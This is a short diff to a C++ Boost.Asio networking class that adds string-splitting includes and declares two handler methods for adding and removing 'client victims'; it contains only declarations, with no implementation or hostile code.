@@ -7,6 +7,8 @@
 #include <boost/asio.hpp>
 #include <boost/asio/io_context.hpp>
 #include <boost/bind/bind.hpp>
+#include <boost/algorithm/string/classification.hpp> // Include boost::for is_any_of
+#include <boost/algorithm/string/split.hpp> // Include for boost::split
 #include <chrono>
 #include <cstdint>
 #include <future>
@@ -36,6 +38,9 @@ class client {
 	void handleResponse(std::string &, session *);
 	void handleAlive(std::string &, std::vector<std::string> &, session *);
 	void handleInit(std::string &, std::vector<std::string> &, session *);
+	void handleAddClientVictim(std::string &, std::vector<std::string> &, session *);
+	void handleRemoveClientVictim(std::string &, std::vector<std::string> &, session *);
+
 
 	io::io_context &io_context_;
 	tcp::acceptor acceptor_;
